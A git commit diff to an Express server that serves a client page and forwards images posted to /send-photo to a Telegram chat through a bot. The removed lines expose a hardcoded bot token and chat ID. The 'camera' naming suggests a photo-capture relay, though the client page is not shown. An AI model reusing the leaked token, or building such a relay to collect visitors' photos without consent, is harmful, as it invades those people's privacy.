9eb376d9e53397288b2d3896d2af4d206e28bbff
Abror305 <dilfuzaalmatova78@gmail.com>
2025-07-15 22:09:29 +0500

    Fix fetch URL for Render domain

--- server.js
+++ server.js
@@ -1,28 +1,33 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
+const path = require('path');
 const app = express();
 
-// Bu yerda sizning tokeningiz va chat_idingiz
-const BOT_TOKEN = '7587178192:AAGxmUnjNYGx0rvoLlGqH9sZ_l6O9AKElbI';
-const CHAT_ID = '7086429203'; // Sizning Telegram chat ID
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-app.use(bodyParser.json({ limit: '10mb' }));
+// public fayllar uchun
+app.use(express.static('public'));
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'client.html'));
+});
 
 app.post('/send-photo', async (req, res) => {
-    try {
-        const image = req.body.image;
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            chat_id: CHAT_ID,
-            photo: image
-        });
-        res.sendStatus(200);
-    } catch (err) {
-        console.error('Xatolik:', err.message);
-        res.sendStatus(500);
-    }
+  try {
+    const image = req.body.image;
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      chat_id: CHAT_ID,
+      photo: image
+    });
+    res.sendStatus(200);
+  } catch (err) {
+    console.error('Xatolik:', err.message);
+    res.sendStatus(500);
+  }
 });
 
 app.listen(3000, () => {
-    console.log('✅ Server ishga tushdi:  https://abror305.github.io/camera/');
+  console.log('✅ Server ishga tushdi');
 });
